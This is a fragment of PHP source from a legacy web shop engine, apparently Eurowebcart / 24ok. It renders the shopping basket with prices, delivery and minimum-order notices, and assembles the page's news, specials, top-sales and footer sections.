    $full_basket .="<table class=table border=\"0\" cellspacing=\"0\" cellpadding=\"4\" width=100%><tr><td valign=top align=center>$llid".@$out_c[9]."</a></td><td valign=top align=left>";
    if ($hidart==1) {
    $itid=strtoupper(substr(md5( str_replace(" ID:", "", str_replace(strtoken ($item['info'], " ID:") , "" , $item['info'])).$artrnd), -7));
    $full_basket .= "$llid".strtoken(strtoken(str_replace(" ID:","^", $item['info']), "^" ),"*")." $itid</a>".$item['options']."<br>";
    } else {
    $full_basket .= "$llid".strtoken(str_replace(" ID:","^", $item['info']), "^" )."</a>".$item['options']."<br>";
    }
    $mainbasket .= "<br><li><small>$llid".strtoken(str_replace(" ID:","^", $item['info']), "^" )."</a>".$item['options']."</small></li>";

    if ($wishzak!="") {
    if ($hidart==1) {
    $wishn=strtoken($item['info'],"*"). " $itid";
    } else {
    $wishn=$item['info'];
    }
    if (!isset($wishm[$wishn])){ $wishm[$wishn]="";}
    if (!preg_match('/^[à-ÿÀ-ßa-zA-Z0-9_\.\,\;\?\&\ \%\(\)\/-]+$/i',$wishm[$wishn])) {  $wishm[$wishn]="";}
    if ($wishm[$wishn]!="") {
    $full_basket .= "<b>".$lang[77].":</b> ". $wishm[$wishn];
    }
    }
    $full_basket .= "<br><b>".$lang['qty']."</b> (".$out_c[11].") <b>:</b> ";
    $mainbasket .="<br><small>".$item['qty']." ".$out_c[11]."";
     $minorder=1; $minorder2=2; $minorderblock=""; $minsht=""; $minupak="";
  if (!isset($out_c[$minorderrow])) { } else { $out_c[$minorderrow]=doubleval($out_c[$minorderrow]);
  if (@$out_c[$minorderrow]>=1) {$minorder=@$out_c[$minorderrow]; $minorder2=(@$out_c[$minorderrow]*2); $minorderblock=" readonly=readonly"; $minsht="<br><font color=$nc3>".str_replace("[pcs]",$out_c[11], str_replace("[num]","$minorder", $lang[1005]))."</font>"; $minupak="<br><font color=$nc3>".str_replace("[pcs]",$out_c[11], str_replace("[num]","$minorder", $lang[1006]))."</font><br>";}
  }
    if ($wishzak=="") {
    $full_basket .= "<a href=\"#minus\" class=btn onclick=\"javascript:if(document.getElementById('new_qty_".md5($item['id'])."').value>=1){document.getElementById('new_qty_".md5($item['id'])."').value-=$minorder;}\"><i class=icon-minus></i></a><input type=\"text\" id=\"new_qty_".md5($item['id'])."\" name=\"new_qty[".md5($item['id'])."]\" size=\"2\" value=\"".$item['qty']."\" style=\"text-align: center;\" class=input-mini".$minorderblock."><a href=\"#plus\" class=btn onclick=\"javascript:document.getElementById('new_qty_".md5($item['id'])."').value-=-$minorder;\"><i class=icon-plus></i></a>";
    } else {
    $full_basket .=$item['qty'];
    }
    $full_basket .= "";
    if ($wishzak=="") {
    $full_basket .= "<a class=btn href=\"$htpath/index.php?action=del&cod=". md5($item['id']) ."&flag=".$item['flag']."\" title=\"".$lang['del']."\"><i class=icon-remove></i></a><br>$minsht$minupak";
    }
    if ($use_weight==1) {$full_basket .= "<br><b>".$lang['weight'].":</b> ".$item['weight']."$kg$sqrp<br>";}
    if ($use_volume==1) {$full_basket .= "<b>".$lang['volume'].":</b> ".$item['volume']."$vol$sqrp<br>";}

    if ($item['price']>0) { $full_basket .= "<b>".$lang['price'].":</b> ".($okr*round($item['price']*$kurs/$okr))." ".$currencies_sign[$_SESSION["user_currency"]]."$sqrp $prski<br>"; }
    if($item['qty']!=1) {
    if ($item['price']>0) {$full_basket .= "<b>".$lang['subtotal'].":</b> ".$item['qty']*($okr*round($item['price']*$kurs/$okr))." ".$currencies_sign[$_SESSION["user_currency"]];
    }
    if ($use_weight==1) {$full_basket .= "<br><b>".$lang['subtotalweight'].":</b> ".$item['subtotalweight']."$kg"; }
    if ($use_volume==1) {$full_basket .= "<br><b>".$lang['subtotalvolume'].":</b> ".$item['subtotalvolume']."$vol"; }}

    if ($item['price']>0) {$mainbasket .= " x ".($okr*round($item['price']*$kurs/$okr))." ".$currencies_sign[$_SESSION["user_currency"]];}
    $mainbasket .= "</small><br>";

    $summa+=$item['qty']*($okr*round($item['price']*$kurs/$okr));


    $full_basket .= "</small></td></tr></table>";


  unset ($out_c);
  }

  $addtospec="";
  if(($details[7]=="ADMIN")||($details[7]=="MODER")){
  if (($valid=="1")){ $addtospec="<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"action\" value=\"addtospec\"><input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang[258]."\"></form><br><br><br>"; }}

$oform = "</form><form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\"><input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang['back']."\"></form>";



if (($wishzak==1)&&($valid=="1")&&($login!="")&&($password!="")) {


$oform.="<p align=center><b>".$lang[245]."</b><br>".$lang[246]." <a href=\"".$_SERVER['PHP_SELF']."?action=zakaz&wishzak=1&flag=".$cart->basket_speek."\"><b>".$lang[247]."</b></a></p><META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=" . $_SERVER['PHP_SELF']. "?action=zakaz&wishzak=1&flag=".$cart->basket_speek."\">";}


if ($full_basket!=""){ $tovarov=$cart->itemcount;  $stuks = $cart->itemstuks;
if($summa<$currencies_zakaz_menee[$valut]){$ditogo=$summa+$zakaz_do_stavka;
if ($dost_naim1!="") {
$ddost="<br><small>$dost_naim1".$currencies_zakaz_menee[$valut]." ".$currencies_sign[$_SESSION["user_currency"]]." - <b> ".$currencies_zakaz_dostav[$valut]."</b> ".$currencies_sign[$_SESSION["user_currency"]]."</small><br></small><br>".$lang[34].": <b>".$ditogo."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]."<br>";
} else {
$ddost="<br>".$lang[34].": <b>".$ditogo."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]."<br>";
}
}else{
if ($dost_naim2!="") { $ddost="<br>$dost_naim2".$currencies_zakaz_menee[$valut]." ".$currencies_sign[$_SESSION["user_currency"]]."</small>";
} else {
$ddost="";
}
}
if ($view_freedeliveryicon==0) {$ddost="";}

$oform ="</form>$addtospec<table border=\"0\" width=\"100%\"><tr><td width=25%>";
if ($wishzak=="") {
if ($action=="zakaz") {$classic_basket=1;}
if ($classic_basket==1) {$oform.="<button class=btn type=button onclick=\"javascript:basket.submit()\" title=\"".$lang['recalc']."\"><i class=icon-refresh></i>&nbsp;".$lang['recalc']."</button></td><form class=form-inline action=\"".$_SERVER['PHP_SELF']."\" method=GET><td width=25% align=center>";
} else {
$oform.="<form class=form-inline action=\"".$_SERVER['PHP_SELF']."\" method=GET>";}
$oform.="<a href=index.php?action=clear class=btn><i class=icon-remove></i>&nbsp;".$lang['clear']."</a></td></form><td align=right width=25%><a href=\"#back\" class=btn onclick=\"javascript:history.go(-1)\"><i class=icon-arrow-left></i>&nbsp;".$lang['back']."</a></td>";}
if ($wishlist==1) { $ddost=""; }
if($allow_complex==1) {
  while (list($kwkey,$kwval)=each($wishm2)) {
  $kwval=($okr*(round($kurs*$kwval/$okr)));
  $ddost .= "<br><b>$kwkey</b> - $kwval ".$currencies_sign[$_SESSION["user_currency"]]."\n";
  	}
  	}
if ($action!="zakaz") {



if (($minimal_order_not_available==1)&&($summa<$currencies_minimal_order[$_SESSION["user_currency"]])) {$oform.= "<div class= round3>$lang[1009] <b>".$currencies_minimal_order[$_SESSION["user_currency"]]."</b> ".$currencies_sign[$_SESSION["user_currency"]]."</div>"; } else {$oform.= "<form class=form-inline action=\"".$_SERVER['PHP_SELF']."\" method=GET id=o-form><td width=25% align=right><input type=hidden name=\"action\" value=\"$allow_zakaz\"><input type=hidden name=\"flag\" value=\"".$cart->basket_speek."\"><a href=\"#submit\" class=\"btn btn-primary\" onclick=\"document.getElementById('o-form').submit();\"><i class=\"icon-ok icon-white\"></i><font color=white>&nbsp;".$lang[59]."</font></a></td></form>"; }
}
$oform.= "</tr></table>"; }
if ($classic_basket==0) {
if ($action!="zakaz") {
$print_basket=jsbbb("jscheckout");
} else {
$print_basket=$full_basket;
}
} else {
$print_basket="<small>$full_basket</b></small><div class=\"comnts\"><i class=icon-refresh></i>&nbsp;".$lang[279]."</div><p align=\"left\">";
}
if ($use_weight==1) {$print_basket.=$lang['totalweight'].": <b><span id=\"jsves\">".$totalweight."</span></b> ".$kg."<br>";}
if ($use_volume==1) {$print_basket.=$lang['totalvolume'].": <b><span id=\"jsvolume\">".$totalvolume."</span></b> ".$vol."<br>";}
if ($classic_basket==1) { $print_basket.=$lang[350]." <b>$stuks</b> <br>"; $print_basket.=$lang[32].": <b>$tovarov</b> <br>"; }
if($summa>0) { $print_basket.=$lang[33].": <b><span id=\"jscheck\">".$summa."</span></b>"." ".$currencies_sign[$_SESSION["user_currency"]];
if ($action=="basket") {$print_basket.="<div class=hidden>".$lang[33].": <b><span id=\"sosk\">".$summa."</span></div>";}
} else {
$print_basket.="<div class=hidden>".$lang[33].": <b><span id=\"jscheck\">".$summa."</span></b>"." ".$currencies_sign[$_SESSION["user_currency"]]."</div>";
if ($action=="basket") {$print_basket.="<div class=hidden>".$lang[33].": <b><span id=\"sosk\">".$summa."</span></div>";
}
}

if ($classic_basket==1) {$print_basket.=@$ddost; }
$print_basket.="</p> ".$oform;
$mainbasket="<small>$mainbasket</small><hr noshade size=\"1\" color=\"$nc2\"><p align=\"left\">";
if ($use_weight==1) {$mainbasket.=$lang['totalweight'].": <b>".$totalweight."</b> ".$kg."<br>";}
if ($use_volume==1) {$mainbasket.=$lang['totalvolume'].": <b>".$totalvolume."</b> ".$vol."<br>";}
$mainbasket.=$lang[350]." <b>".$stuks."</b><br>$lang[32]".": <b>".$tovarov."</b>";
if($summa>0) { $mainbasket.="<br>".$lang[33].": <b>".$summa."</b>"." ".$currencies_sign[$_SESSION["user_currency"]].@$ddost;}
$mainbasket.="</p> ";
if (($minimal_order_not_available==1)&&($summa<$currencies_minimal_order[$_SESSION["user_currency"]])) { $mainbasket.= "<div class= round3>$lang[1009] <b>".$currencies_minimal_order[$_SESSION["user_currency"]]."</b> ".$currencies_sign[$_SESSION["user_currency"]]."</div>"; } else {$mainbasket.="<form class=form-inline action=\"".$_SERVER['PHP_SELF']."\" method=GET><input type=hidden name=\"action\" value=\"$allow_zakaz\"><input type=hidden name=\"flag\" value=\"".$cart->basket_speek."\"><div align=center><input class=btn type=submit value=\"".$lang[59]."&nbsp;&nbsp;&nbsp;&gt;&gt;\"></div></form><br><hr noshade color=\"$nc6\" size=1><br>"; }



if ($view_baskinlist==1) {
if (($unifid!="")||($catid!="_")||($query!="")) {
$baskinlist.="<hr noshade size=\"1\" color=\"$nc2\"><h4><font color=\"".$style['nav_col1']."\">".$lang[31].":</font></h4>$print_basket<hr noshade size=\"1\" color=\"$nc2\">";
}
}
if (($action=="basket")||($action=="zakaz")) {
if ($classic_basket==1) {
top("", "<h4><font color=\"".$style['nav_col1']."\">".$lang[31].":</font></h4>$print_basket<br>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[basket]");
} else {
top("", "$print_basket<br>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[basket]");

}
}


} else {

  foreach($items as $item) {
    if ($hidart==1) {
    $basket .= str_replace("title=", "id=", $item['img'])."<a href=\"$htpath/index.php?unifid=".md5($item['info'])."&flag=".$item['flag']."\"><font color=\"".$style['nav_col1']."\">".strtoken(strtoken(str_replace(" ID:","^", $item['info']), "^" ),"*")." $itid</font></a>".$item['options']."";
    } else {
    $basket .= str_replace("title=", "id=", $item['img'])."<a href=\"$htpath/index.php?unifid=".md5($item['info'])."&flag=".$item['flag']."\"><font color=\"".$style['nav_col1']."\">".strtoken(str_replace(" ID:","^", $item['info']), "^" )."</font></a>".$item['options']."<br>";
    }

    $basket .= "".$item['qty']." <b>x</b> ";
    if ($item['price']>0) {
    $basket .= ($okr*round($item['price']*$kurs/$okr))." ".$currencies_sign[$_SESSION["user_currency"]]."<br>";


    $basket .= "<b>".$lang['price'].":</b> ".(($okr*round($item['price']*$kurs/$okr))*$item['qty'])." ".$currencies_sign[$_SESSION["user_currency"]]."$prski<br>";
    }
    $basket.="<br>";
  }

  if ($basket!=""){
  $stuks = $cart->itemstuks;
   $tovarov = $cart->itemcount;
   $summa = $cart->total;
   if($summa<$currencies_zakaz_menee[$valut]){
   $ditogo=$summa+$zakaz_do_stavka;
   if ($dost_naim1!="") {
   $ddost="<br><small>$dost_naim1".$currencies_zakaz_menee[$valut]." ".$currencies_sign[$_SESSION["user_currency"]]." - <b> ".$currencies_zakaz_dostav[$valut]."</b> ".$currencies_sign[$_SESSION["user_currency"]]."</small><br></small><br>".$lang[34].": <b>".$ditogo."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]."<br>";
   } else {
   $ddost="<br>".$lang[34].": <b>".$ditogo."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]."<br>";
   }
   }else{
   if ($dost_naim2!="") {
   $ddost="<br>$dost_naim2".$currencies_zakaz_menee[$valut]." ".$currencies_sign[$_SESSION["user_currency"]]."</small>";
   } else{
   $ddost="";
   }
   }
   if ($view_freedeliveryicon==0) {
   $ddost="";
   }

if (($minimal_order_not_available==1)&&($summa<$currencies_minimal_order[$_SESSION["user_currency"]])) { $oform= "<div class= round3>$lang[1009] <b>".$currencies_minimal_order[$_SESSION["user_currency"]]."</b> ".$currencies_sign[$_SESSION["user_currency"]]."</div>";} else {  $oform="<table width=100% border=0><tr><td align=center>".but ("<a href=\"$htpath/index.php?action=basket&flag=".$cart->basket_speek."\">$lang[31]</a>", $nc6,$nc6,$nc0)."</td><td align=center>". but ("<a href=\"$htpath/index.php?action=$allow_zakaz&flag=".$cart->basket_speek."\">".$lang[59]."</a>", $nc6,$nc6,$nc0) ."</td></tr></table>"; }
  }

if ($wishlist==1) { $ddost="";}
  $print_basket="<small>$basket</small>";
  if ($summa>0) {
  $print_basket.="<p align=\"right\">".$lang[33].":<b>".$summa."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]." ".@$ddost."</p>";
  }
  $print_basket.="<br> $oform";

}


$prem1="";$prem2="";$prbuy="";




if ($query!="") {
topwo("", "$gb", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[gb]");
}



if ($action=="doubles") {
require ("./templates/$template/view.inc");
require ("./modules/doubles.php");
$mod="admin";
top("", "$spisok", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content1]");
}


require ("./modules/main.php");
if ($style['catid_desc']==1){
if (($query=="")&&($register!=1)&&($action!="doubles")&&($action!="replacer")&&($action!="addtospec")&&($action!="tospec")&&($action!="folderimg")&&($action!="viewfile")&&($action!="zakaz")&&($action!="basket")&&($action!="allnews")&&($action!="clear")&&($action!="sendmail")&&($action!="sendok")&&($action!="forum")&&($action!="forum_admin")&&($action!="vreg")&&($action!="view_users")&&($action!="view_links")&&($action!="view_cmenu")&&($action!="links")&&($action!="view_baskets")&&($action!="template")&&($action!="htaccess")&&($action!="userip")&&($mod!="admin")&&($action!="send")){
require ("./modules/catid_desc2.php");
top("", "$catid_content2" , $style ['center_width'], $nc0, $nc0, 4,1,"[catid2]");
}
}
require "./modules/viewjs.php";
if (($action=="x")&&($catid=="")&&($fid=="")){
top("",  "$rss", $style ['center_width'], $nc0, $nc0, 4,1,"[rss]");
}

$jslist="";

if ($view_baskinlist==1) { if (($action=="basket")||($action=="zakaz")) { $baskinlist=""; } if ($tovarov>0) { top("", "$baskinlist", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[basketinlist]"); }}
if ($smod=="shop") {if ($style['dirs_h']==1){

require ("./modules/dirs_h.php");
if ($repzeme!="") {
$dirs_h_content=str_replace("$repzeme","themes/$repzeme",$dirs_h_content);
}
top("", "$dirs_h_content", $style ['center_width'], $nc0, $nc0 , 4,1,"[dirs_h]" );

}
}

if ($action!="allnews") {
require ("./modules/news.php");
top("", "$latestnews", $style ['center_width'], $nc0, $nc0 , 4,1,"[news]");
}







$oldperpage=$perpage;

if ((@$register=="")&&($smod=="shop")&&($view_noveltys==1)&&($mod!="admin")){

$last_bb=$view_buybut;
$last_vc=$varcart;
$last_cg=$cols_of_goods;
$cols_of_goods=$js_max;
$varcart=-1;
$perpage=$lastgoods_perpage;
require ("./templates/$template/view.inc");
$varcart=$last_vc;
require ("./modules/novelty.php");
$view_buybut=$last_bb;
$cols_of_goods=$last_cg;
if ($noveltys_spisok!="") {
top("", "$noveltys_spisok", $style ['center_width'],$nc0, $nc0, 5,0,"[novelty]");
}
unset($noveltys_spisok);


}
$perpage=$oldperpage;
if (($view_statii==1)&&($mod!="admin")){
if (($action!="zakaz")&&($action!="replacer")&&($action!="folderimg")&&($query=="")&&(@$register=="")&&($action!="sendmail")&&($action!="sendok")&&($action!="basket")&&($action!="send")&&($action!="clear")&&($action!="forum")&&($action!="forum_admin")&&($action!="view_users")&&($action!="links")&&($action!="view_links")&&($action!="view_links")&&($action!="view_baskets")&&($action!="template")&&($action!="htaccess")&&($action!="userip")&&($mod!="admin")) {
require ("./modules/topics.php");
top($lang[260], "$topics", $style ['center_width'], strtolower($style ['sale']), strtolower($style ['bg_content']), 5,0,"[topics]" );
}
}
if (($action!="zakaz")&&($action!="tospec")&&($action!="addtospec")&&($action!="replacer")&&($action!="folderimg")&&(@$register=="")&&($action!="clear")&&($action!="ext_search")&&($action!="viewfile")&&($action!="sendmail")&&($action!="sendok")&&($action!="allnews")&&($action!="forum")&&($action!="forum_admin")&&($action!="view_users")&&($action!="view_links")&&($action!="view_cmenu")&&($action!="links")&&($action!="view_baskets")&&($action!="template")&&($action!="htaccess")&&($action!="userip")&&($mod!="admin")&&($action!="basket")&&($action!="send")&&($query=="")) {

if (($smod=="shop")&&($mod!="admin")) { if ($view_vitrin==1){
require ("./modules/vitrina.php");
top("", "$vitrina", $style ['center_width'], $nc10, $nc0 , 4,1,"[vitrina]");
}
}
}


if (($smod=="shop")&&($mod!="admin")) {
$top_sales_spisok="";
$old_vc=$varcart;
$varcart=$top_sales_varcart;
$last_cg=$cols_of_goods;
$cols_of_goods=$top_sales_cols;
$last_bb=$view_buybut;
$view_buybut=0;
$last_qt=$view_list_qty;
$view_list_qty=0;
$stinfo="";
require ("./modules/".$scriptprefix."top_sales.php");
$view_list_qty=$last_qt;
$varcart=$old_vc;
$cols_of_goods=$last_cg;
$view_buybut=$last_bb;
unset($top_sales_spisok);

}
if ($view_birth=="c") {
top("", "$birthday", $style ['center_width'], $nc2, $nc0, 5,0,"[birthday]");
}
if ($view_tag_clouds=="c") {
top("", "$tags_cloud", $style ['center_width'], $nc0, $nc0, "noshadow",1,"[tagclouds]"); }


if ($usetheme==0) {
if ($css_style==1) {
if ($affix==1) {
echo "</td></tr></table>";
} else {
echo "</td></tr></table></td><td valign=\"top\" bgcolor=\"".$style['tbgcolor']."\" align=\"right\">";
}
} else {
echo "</td></tr></table></td><td valign=top background=\"grad.php?h=1&w=10&e=".str_replace("#","",$nc0)."&s=".str_replace("#", "", $nc6)."&d=horizontal\"><img src=\"$image_path/pix.gif\" width=10 height=16 border=0 style=\"background-color: $nc0\"></td><td valign=\"top\" bgcolor=\"".$style['tbgcolor']."\" align=\"right\">";
}
}



if ($catid==""){$catidy=@$podstava["".@$dir."|".@$subdir."|"];}else{$catidy=$catid;}

if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="r")) { } else {$catidy="_";}
if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="r")&&($mod!="admin")) {
if ($usetheme==0) {$spectit="<div align=center><span class=\"label label-info\">".$lang[236]."</span></div>";} else {$spectit="";}


$oldperpage=$perpage;

if ($smod=="shop"){

$last_vc=$varcart;
$last_cg=$cols_of_goods;
$cols_of_goods=$spec_cols;
$varcart=$varcart_of_spec;

$last_bb=$view_buybut;
$last_qt=$view_list_qty;
$view_list_qty=0;
$view_buybut=0;
$perpage=$lastgoods_perpage;
require ("./templates/$template/view.inc");
require ("./modules/spec.php");
$view_buybut=$last_bb;
$view_list_qty=$last_qt;
$varcart=$last_vc;
$cols_of_goods=$last_cg;




}





if ($catidy=="_") { $glav=" ".$lang[276]; } else {$glav="";}
if(($details[7]=="ADMIN")||($details[7]=="MODER")){
if (($valid=="1")){
$specadmi= "<span class=\"label label-info\">".$lang[236]."</span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></span><br><br>";
$spec_spisok.=$specadmi;
}
}

top("", "$spectit$spec_spisok", "100%",  $nc0, $nc0 , "noshadow",1, "[specpr]");




}


if ($view_birth=="r") {
top("<div style=\"white-space:nowrap;\"><small>$lang[1497]</small></div>", "$birthday", $style ['right_width'], $nc2, $nc0, 5,0,"[birthday]");
}
if (($smod=="shop")&&($action!="allbrands")&&($brandtype==3)){

require ("./modules/brands.php");
topwo ($lang[355], $brandslist, "100%", strtolower($style ['new']), strtolower($style ['left_menu']), 2,0, "[brandlist]");

}
if (($incart_menu==0)&&($unifid!="")&&($catid=="")) {include "./templates/$template/menu.inc";
echo "$admined"; }

if ($view_tag_clouds=="r") {
top("", "$tags_cloud", $style ['right_width'], $nc2, $nc0, 5,0,"[tagclouds]");
}

if ($usetheme==0) {
if ($affix==0) {
echo "</td></tr>";
}
/*
if ($css_style==1) {
echo "<tr><td colspan=\"2\" align=\"center\" valign=\"top\"></td><td align=\"center\" valign=\"top\"><img src=\"$image_path/pix.gif\" width=1 height=1 border=0></td><td colspan=\"2\" align=\"center\" valign=\"top\"></td></tr>
<tr><td align=\"center\" colspan=\"5\" valign=\"top\"><br>";
} else {
echo "<tr><td colspan=\"2\" align=\"center\" valign=\"top\" bgcolor=\"".$style['tbgcolor']."\"></td><td align=\"center\" valign=\"top\" bgcolor=\"$nc6\"><img src=\"$image_path/pix.gif\" width=1 height=1 border=0></td><td colspan=\"2\" align=\"center\" valign=\"top\" bgcolor=\"".$style['tbgcolor']."\"></td></tr>
<tr><td align=\"center\" colspan=\"5\" valign=\"top\" bgcolor=\"".$style['tbgcolor']."\"><br>";
}
*/
}
if ($usetheme==0) {


if ($usetheme==0) {
if (($action=="x")&&($catid=="")&&($fid=="")){
include ("./templates/$template/banner_ads.inc");
}

if ($view_counter==1) {echo "$counter_total";}
include ("./templates/$template/counters.inc");
}

if ($affix==1) {
echo "</div></td></tr></table><div id=\"footer\">";
} else {
echo "</td></tr></table>";
echo "</td></tr></table>";
}
}

if ($bottom_links!="") {
if ($view_office==1) {
topwo("", "<table width=100%><tr><td><img src=$image_path/pix.gif border=0></td><td style=\"width:$shwid; padding:20px\"><i class=icon-time></i> <font color=\"".$nc5."\">$wtime</font></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
}
topwo("", "<table width=100%><tr class=bottom_links><td><img src=$image_path/pix.gif border=0></td><td class=bottom_links style=\"width:$shwid; padding:20px 0px 20px 0px;\">$bottom_worktime$bottom_links$time_to_work<div class=clearfix></div></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");

}
$footer="";
if ($usetheme==0) {
if (file_exists("./templates/$template/footer.txt")) {
require("./templates/$template/footer.txt");
} else {
topwo("", "<table width=100%><tr class=footer><td><img src=$image_path/pix.gif border=0></td><td class=footer style=\"width:$shwid; padding:20px\">Powered by: <a href=\"http://www.24ok.ru/\">Eurowebcart / 24ok</a><div class=clearfix></div></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
}

if (($incart_menu==0)&&($unifid!="")&&($catid=="")) {
topwo("", "<table width=100%><tr class=footer><td><img src=$image_path/pix.gif border=0></td><td class=footer style=\"width:$shwid; padding:20px\">$footer<div class=clearfix></div></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
} else {
if ($leftmenu==1) {
if ((preg_match("/24ok/i",$footer))||(preg_match("/eurowebcart/i",$footer))) {
topwo("", "<table width=100%><tr class=footer><td><img src=$image_path/pix.gif border=0></td><td class=footer style=\"width:$shwid; padding:20px\">$footer</td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
} else {
topwo("", "<table width=100%><tr class=footer><td><img src=$image_path/pix.gif border=0></td><td class=footer style=\"width:$shwid;\">$rekm</td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
}
} else {
topwo("", "<table width=100%><tr class=footer><td><img src=$image_path/pix.gif border=0></td><td class=footer style=\"width:$shwid; padding:20px\">$footer<div class=clearfix></div></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");

}
}
if ($links_to_bottom==1) {
echo "<table width=100%><tr class=footer><td><img src=$image_path/pix.gif border=0></td><td class=footer style=\"width:$shwid;\">
<div class=pull-right>$rekm</div>";
echo "</td><td><img src=$image_path/pix.gif border=0></td></tr></table>";
}

} else {


if (file_exists("./templates/$template/footer.txt")) {
require("./templates/$template/footer.txt");
} else {
topwo("", "<table width=100%><tr><td><img src=$image_path/pix.gif border=0></td><td style=\"width:$shwid; padding:20px\">Powered by: <a href=\"http://www.24ok.ru/\">Eurowebcart / 24ok</a><div class=clearfix></div></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
}

if (($incart_menu==0)&&($unifid!="")&&($catid=="")) {
topwo("", "<table width=100%><tr><td><img src=$image_path/pix.gif border=0></td><td style=\"width:$shwid; padding:20px\">$footer<div class=clearfix></div></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
} else {
if ($leftmenu==1) {
if ((preg_match("/24ok/i",$footer))||(preg_match("/eurowebcart/i",$footer))) {
topwo("", "<table width=100%><tr><td><img src=$image_path/pix.gif border=0></td><td style=\"width:$shwid; padding:20px\">$footer</td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
} else {
topwo("", "<table width=100%><tr><td><img src=$image_path/pix.gif border=0></td><td style=\"width:$shwid;\">$rekm</td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
}
}
}
if ($links_to_bottom==1) {
topwo("", "<table width=100%><tr><td><img src=$image_path/pix.gif border=0></td><td style=\"width:$shwid;\">$rekm$admined<div class=pull-right>$rekm</div></td><td><img src=$image_path/pix.gif border=0></td></tr></table>", "100%", $nc0, $nc0, 4,1,"[footer]");
}
}
if ($catid!="0") {$zamen=1;}
if ($unifid!="") {$zamen=1;}
if ($usetheme==1) {

if ($zamen==1) {
reset($translate_it);
while (list ($keyti, $stti) = each ($translate_it)) {
$themecontent=str_replace($keyti,$stti,$themecontent);


}
}
if (!isset($_SESSION["user_lang"])||($oldanguage==$_SESSION["user_lang"])) {
$match = ExtractString($themecontent, "[buy]", "[/buy]");
$themecontent=str_replace("<img src=\"$image_path/buy.gif\" border=\"0\">","$match",$themecontent); //replace standart Buy button REQUIRED





}
$nbutton = ExtractString($themecontent, "[next]", "[/next]");
if ($nbutton!="") {
$themecontent=str_replace($lang[162]." &gt;&gt;</a>","$nbutton</a>",$themecontent);

}
$pbutton = ExtractString($themecontent, "[prev]", "[/prev]");
if ($pbutton!="") {
$themecontent=str_replace("&lt;&lt; ".$lang[163]."</a>","$pbutton</a>",$themecontent);
}

$hbutton = ExtractString($themecontent, "[home]", "[/home]");
if ($hbutton!="") {
$themecontent=str_replace("<!--homee--></a>|","$hbutton</a>",$themecontent);
}
$sbutton = ExtractString($themecontent, "[sbutton]", "[/sbutton]");
if ($sbutton!="") {
$themecontent=str_replace("<input type=submit id=\"subm\" value=\"ok\">","<a href=\"javascript:document.ok.submit()\">$sbutton</a>",$themecontent);
$themecontent=str_replace("<input type=submit value=\"&gt;&gt;\">","<a href=\"javascript:document.search.submit()\">$sbutton</a>",$themecontent);
}

}


if (($theme_file!="")&&($ftfs>1)) {if ($action!="thtml") {  $themecontent=str_replace("[list_themes]","$thtmls",$themecontent);}}


require ("./modules/content.php");

if ($view_generated_time==1){

list($msec,$sec)=explode(chr(32),microtime());
echo "<center><p align=center><small>".$lang[280]." <b>".round(($sec+$msec)-$HeadTime,4)."</b> sec<br>" . "Last-Modified: ".gmdate("D, M d Y H:i:s",(time()-86400))." GMT</small></p></center>";

        }
clearstatcache ();

}
if ($usetheme==0) {
if ($affix==1) {
echo "</div></div>";
}
}
echo "
</body>
</html>";
?>
